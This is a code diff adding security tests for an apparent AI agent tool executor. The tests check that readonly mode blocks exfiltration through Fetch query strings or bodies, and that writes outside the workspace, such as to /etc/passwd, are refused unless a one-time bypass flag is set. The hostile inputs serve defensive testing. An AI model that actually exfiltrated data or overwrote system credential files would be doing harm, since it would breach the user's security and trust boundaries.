@@ -414,3 +414,70 @@ describe("Security: environment sanitization", () => {
     assert.equal(exec.trustMode, "open");
   });
 });
+
+// ── New Fetch security tests ─────────────────────────────────────────────────
+
+describe("Security: readonly Fetch blocks query params", () => {
+  it("blocks GET with query parameters in readonly mode", async () => {
+    const exec = new ToolExecutor({ workspace: "/tmp", trustMode: "readonly" });
+    const result = await exec.execute("Fetch", {
+      url: "https://example.com/api?secret=stolen_data",
+    });
+    assert.ok(result.includes("query") || result.includes("Error"),
+      `Should block query params in readonly, got: ${result}`);
+  });
+
+  it("allows pure GET without query params in readonly mode", async () => {
+    const exec = new ToolExecutor({ workspace: "/tmp", trustMode: "readonly" });
+    // This will fail at network level, but should NOT be blocked by the query check
+    const result = await exec.execute("Fetch", {
+      url: "https://example.com/api",
+    });
+    // Should not be blocked by readonly check — may fail at network level which is fine
+    assert.ok(!result.includes("query parameters are not allowed"),
+      `Pure GET should not be blocked by query check, got: ${result}`);
+  });
+
+  it("blocks GET with body in readonly mode", async () => {
+    const exec = new ToolExecutor({ workspace: "/tmp", trustMode: "readonly" });
+    const result = await exec.execute("Fetch", {
+      url: "https://example.com/api",
+      body: "exfiltrated data",
+    });
+    assert.ok(result.includes("body") || result.includes("read-only"),
+      `Should block body in readonly, got: ${result}`);
+  });
+});
+
+describe("Security: one-time outside-workspace bypass", () => {
+  it("_allowOutsideOnce defaults to false", () => {
+    const exec = new ToolExecutor({ workspace: "/tmp/test-ws", trustMode: "approval" });
+    assert.equal(exec._allowOutsideOnce, false);
+  });
+
+  it("bypasses workspace check when _allowOutsideOnce is true", async () => {
+    const exec = new ToolExecutor({ workspace: "/tmp/test-ws", trustMode: "approval" });
+    exec._allowOutsideOnce = true;
+    // This should NOT be blocked by workspace boundary (but may fail for other reasons)
+    const result = await exec.execute("Write", {
+      file_path: "/tmp/outside-test-file.txt",
+      content: "test data",
+    });
+    // Should not contain "outside workspace" error
+    assert.ok(!result.includes("outside workspace"),
+      `Should bypass workspace check with _allowOutsideOnce, got: ${result}`);
+    // Clean up
+    exec._allowOutsideOnce = false;
+  });
+
+  it("blocks outside workspace when _allowOutsideOnce is false", async () => {
+    const exec = new ToolExecutor({ workspace: "/tmp/test-ws", trustMode: "approval" });
+    assert.equal(exec._allowOutsideOnce, false);
+    const result = await exec.execute("Write", {
+      file_path: "/etc/passwd",
+      content: "hacked",
+    });
+    assert.ok(result.includes("outside workspace") || result.includes("blocked"),
+      `Should block outside workspace, got: ${result}`);
+  });
+});
